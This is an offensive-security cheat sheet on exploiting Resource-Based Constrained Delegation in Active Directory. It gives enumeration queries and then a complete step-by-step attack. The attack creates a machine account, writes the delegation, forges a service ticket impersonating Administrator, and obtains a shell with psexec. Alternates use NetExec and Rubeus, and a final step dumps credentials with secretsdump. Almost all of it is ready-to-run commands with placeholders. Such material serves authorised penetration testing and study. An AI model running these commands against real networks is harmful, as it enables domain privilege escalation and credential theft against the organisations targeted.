---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---
## Enumerate Resource-Based Constrained Delegation (RBCD)
resources: [HackTricks RBCD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)

> [!important] **Requirements:**
> - `GenericWrite`, `GenericAll`, `WriteDacl`, or `WriteOwner` on target computer
> - Ability to create machine account (MAQ > 0) or control of existing one
> - Network access to target (port 445)

> [!info] If you have write access to a computer object, configure it to trust a machine you control, then impersonate admin users to it.
### Enumeration with BloodHound
```cypher
# Find write access to computers
MATCH p=(u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer) RETURN p
```
### [Alternate] Enumeration with PowerView
```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { 
  $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite" 
}
```
### Check MachineAccountQuota
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> -M maq
```

### [Alternate] Find Existing RBCD Configurations
```bash
nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation
```

### [Alternate] Impacket
```bash
findDelegation.py <Domain>/<User>:<Pass> -dc-ip <DC_IP>
```

### [Alternate] nxc_enum
```bash
python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation
```

### [Alternate] Hackles (BloodHound)
```bash
python -m hackles -u neo4j -p '<Neo4jPassword>' --delegation
```

### Exploit RBCD
> [!warning] **Troubleshooting:**
> - **Can't create machine account:** (MAQ = 0): Use existing machine account you control
> - **RBCD write fails:** (No write permission): Verify ACLs in **BloodHound**
> - **getST.py fails:** (S4U issues): Check account types, target must be computer
> - **Ticket doesn't work:** (Wrong SPN or hostname): Use FQDN, verify DNS
#### Step 1 - Create a machine account
```bash
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-host <DC_IP> <Domain>/<User>:<Pass>
```
#### Step 2 - Configure RBCD on target
```bash
rbcd.py -delegate-from 'YOURPC$' -delegate-to '<TargetComputer>$' -action write <Domain>/<User>:<Pass>
```
#### Step 3 - Get service ticket as admin
```bash
getST.py -spn cifs/<Target_domain_local> -impersonate Administrator <Domain>/YOURPC$:'Password123!'
```
#### Step 4 - Use the ticket

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-psexec -k -no-pass <Target_domain_local>
```

#### [Alternate] NetExec with RBCD Module
> [!tip] Automated RBCD attack using **NetExec**.

```bash
nxc smb <TargetIP> -u <User> -p '<Pass>' -M rbcd -o action=write delegate_from=YOURPC$ delegate_to=<TargetComputer>$
```

#### [Alternate] Rubeus S4U Attack
```powershell
.\Rubeus.exe s4u /user:YOURPC$ /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:cifs/<Target_domain_local> /ptt
```

#### Validate Access
```bash
nxc smb <Target_domain_local> -u Administrator -k --use-kcache
```

```bash
impacket-secretsdump -k -no-pass <Target_domain_local>
```

### Cleanup RBCD [optional]

#### Remove RBCD configuration
```bash
rbcd.py -delegate-to '<TargetComputer>$' -action flush <Domain>/<User>:<Pass>
```
#### Delete machine account
```bash
addcomputer.py -computer-name 'YOURPC$' -delete -dc-host <DC_IP> <Domain>/<User>:<Pass>
```